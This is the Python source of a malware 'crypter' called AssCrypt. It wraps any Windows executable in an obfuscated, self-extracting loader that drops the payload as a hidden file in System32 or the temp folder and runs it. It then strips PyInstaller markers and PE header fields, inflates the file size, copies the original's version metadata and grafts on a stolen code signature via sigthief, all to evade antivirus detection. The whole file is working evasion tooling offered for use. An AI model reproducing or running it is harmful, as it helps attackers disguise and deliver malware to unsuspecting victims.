import base64
import pefile
import random
import shutil
import time
import zlib
import os

TempFolder = "TEMP"
SelfPath = os.getcwd()

print(" -/- AssCrypt by Luasherov (build > 1.3)  \n")

ToCrypt = input("Enter file to crypt     : ").replace("'", "").replace('"', '')
CustomIcon = input("Use custom icon?        : ").replace("'", "").replace('"', '')
PumpFile = input("Pump the file 100mb max : ")

TimeStamp = time.time()

print("")

if not os.path.exists(ToCrypt):
    print(" -/- Raised Exception: File not found. Press any key to exit.")
    os.system("pause>nul")
    os._exit(2)

if PumpFile != "":
    try:
        int(PumpFile)
    except:
        print(" -/- Raised Exception: Size to pump should be int. Press any key to exit.")
        os.system("pause>nul")
        os._exit(2)

    if int(PumpFile) > 100:
        print(" -/- Raised Exception: Size should be less than 100mb. Press any key to exit.")
        os.system("pause>nul")
        os._exit(2)

print(" -/- Reading file")

File = open(ToCrypt, "rb")
CryptData = File.read()
File.close()

SymbolsToSkip = round(os.path.getsize(ToCrypt) / 10000)

if os.path.exists(TempFolder):
    print(" -/- Removing temp folder")

    try:
        shutil.rmtree(TempFolder)
    except:
        TempFolder = TempFolder + "_"

print(" -/- Making main script")

pe_file = pefile.PE(ToCrypt)

os.mkdir(TempFolder)
os.mkdir(os.path.join(TempFolder, "stuff"))
shutil.copy2(os.path.join("stuff", "upx.exe"), os.path.join(TempFolder, "stuff", "upx.exe"))
shutil.copy2(os.path.join("stuff", "sigthief.py"), os.path.join(TempFolder, "stuff", "sigthief.py"))
shutil.copy2(os.path.join("stuff", "signed.exe"), os.path.join(TempFolder, "stuff", "signed.exe"))
os.chdir(TempFolder)

Payload = base64.b64encode(zlib.compress(CryptData))
ExecutableName = ''.join(random.choices(list("qpoiwueyrtlkjashdfgmnbzxcv0981273645POIQWUEYRTLKJASHDFGMNBZXCV"), k=random.randint(16,32)))
ScriptToCrypt = f"""
while 1:
    try:
        f=__import__('ctypes')
        u=__import__('os')
        c=__import__('base64')
        k=__import__('zlib')
        if f.windll.shell32.IsUserAnAdmin():
            d=u.path.join(u.getenv('systemroot'), 'system32', '{ExecutableName}.exe')
            if u.path.exists(d): f.windll.kernel32.SetFileAttributesW(d, 0x00)
            n=open(u.path.join(u.getenv('systemroot'), 'system32', '{ExecutableName}.exe'), 'wb')
        else:
            d=u.path.join(u.getenv('temp'), '{ExecutableName}.exe')
            if u.path.exists(d): f.windll.kernel32.SetFileAttributesW(d, 0x00)
            n=open(u.path.join(u.getenv('temp'), '{ExecutableName}.exe'), 'wb')
        n.write(k.decompress(c.b64decode({Payload})))
        n.close()
        f.windll.kernel32.SetFileAttributesW(d, 0x06)
        u.startfile(d)
        u._exit(0)
        break
        while 1: pass
    except: pass
"""

ScriptToCrypt = base64.b64encode(zlib.compress(ScriptToCrypt.encode())).decode()

Array = list("base64.dco _imprt!+-/xc")
for Index in range(1, random.randint(2, 40)):
    Array.append(random.choice(list("poiqweurytlkasdfghjmnbzxcvPOQIWUEYRTLKJASDHFGMNBZXCV1234567890-=/!@#$%^&*(){}[]_+~`")))

print(" -/- Creating array")

for Symbol in ScriptToCrypt:
    if Symbol not in Array:
        Array.append(Symbol)
    # else:
    #     if random.randint(1, 50) == 50:
    #         Array.append(Symbol)

random.shuffle(Array)


ArrayName = "_"
OutputScript = f"""
{ArrayName}={Array};exec(__import__('zlib').decompress(__import__('base64').b64decode(f'''
"""

print(" -/- Making main of script")

result = [] # CHATGPT-SOLUTIONS-START
length = len(ScriptToCrypt)

for i in range(0, length, SymbolsToSkip):
    chunk = ScriptToCrypt[i:i + SymbolsToSkip]

    if len(chunk) == SymbolsToSkip:
        result.append(chunk[:-1])

        symbol = chunk[-1]
        result.append(f"{{{ArrayName}[{Array.index(symbol)}]}}")
    else:
        result.append(chunk)

OutputScript = OutputScript + "".join(result) # CHATGPT-SOLUTIONS-END


OutputScript += "'''.encode())))"

File = open(".py", "w")
File.write(OutputScript)
File.close()


print(" -/- Stealing metadata")

Placeholder = """
VSVersionInfo(
ffi=FixedFileInfo(
    filevers=(10, 0, 19041, 746),
    prodvers=(10, 0, 19041, 746),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x2,
    subtype=0x0,
    date=(0, 0)
    ),
kids=[
    StringFileInfo(
    [
    StringTable(
        '040904B0',
        [
{metadata}
        ])
    ]), 
    VarFileInfo([VarStruct('Translation', [1033, 1200])])
]
)
"""

Metadata = ""

Variables = [
    b"CompanyName", b"FileDescription", b"FileVersion",
    b"InternalName", b"LegalCopyright",
    b"OriginalFilename", b"ProductName", b"ProductVersion"
]

if hasattr(pe_file, 'FileInfo'):
    for info in pe_file.FileInfo:
        for data in info:
            if hasattr(data, "Key") and data.Key == b"StringFileInfo":
                for string_table in data.StringTable:
                    for Variable in Variables:
                        if Variable in string_table.entries:
                            key = Variable.decode("utf-8", errors="ignore")
                            value = string_table.entries[Variable].decode("utf-8", errors="ignore")
                            Metadata += f"         StringStruct('{key}', '{value}'),\n"

Metadata = Metadata.rstrip(",\n")

with open("Metadata.txt", "w", encoding="utf-8") as f:
    f.write(Placeholder.format(metadata=Metadata))

print(" -/- Building (May take much time)")

if CustomIcon != "":
    if not os.path.exists(CustomIcon):
        print(" -/- Warning: Icon file are not exist, skipping")
        CustomIcon = ""
    else:
        CustomIcon = f" --icon {CustomIcon} "

os.system(f"pyinstaller.exe --log-level ERROR --hidden-import ctypes --hidden-import os --hidden-import zlib --hidden-import base64 --onefile --noconsole --clean --noconfirm --version-file Metadata.txt{CustomIcon} --upx-dir upx .py")

print(" -/- Removing PyInstaller metadata")

with open(os.path.join("dist", ".py.exe"), "rb") as File:
    Data = File.read()

Data = Data.replace(b"PyInstaller:", b"PyInstallem:")
Data = Data.replace(b"pyi-runtime-tmpdir", b"bye-runtime-tmpdir")
Data = Data.replace(b"pyi-windows-manifest-filename", b"bye-windows-manifest-filename")

StartIndex = Data.find(b"$") + 1
EndIndex = Data.find(b"PE\x00\x00", StartIndex) - 1
Data = Data[:StartIndex] + bytes([0] * (EndIndex - StartIndex))  + Data[EndIndex:]
StartIndex = Data.find(b"PE\x00\x00") + 8
EndIndex = StartIndex + 4
Data = Data[:StartIndex] + bytes([0] * (EndIndex - StartIndex))  + Data[EndIndex:]

with open(os.path.join("dist", ".py.exe"), "wb") as File:
    File.write(Data)
    del Data


if PumpFile != "":
    print(" -/- Pumping file")

    with open("dist\\.py.exe", "ab") as File:
        AdditionalSize = int(PumpFile) * 1024 * 1024

        CurrentSize = File.tell()
        TargetSize = CurrentSize + AdditionalSize

        EmptyBytes = bytearray([0x00] * AdditionalSize)
        File.write(EmptyBytes)

print(" -/- Applying signature")

os.system("stuff\\sigthief.py -i stuff\\signed.exe -t dist\\.py.exe -o dist\\signed.exe")

print(" -/- Cleaning ")

shutil.rmtree("build")
shutil.rmtree("stuff")
os.remove(".py")
os.remove(".py.spec")
os.remove("Metadata.txt")

FileName = f"crypted_{random.randint(111111111111, 999999999999)}.exe"
shutil.copy(os.path.join("dist", "signed.exe"), os.path.join(SelfPath, FileName))
shutil.rmtree("dist")

os.chdir(SelfPath)
shutil.rmtree(TempFolder)

print(f" -/- Done! Taken {round(time.time() - TimeStamp, 2)}s, output file are '{FileName}'.")
os.system("pause>nul")
os._exit(0)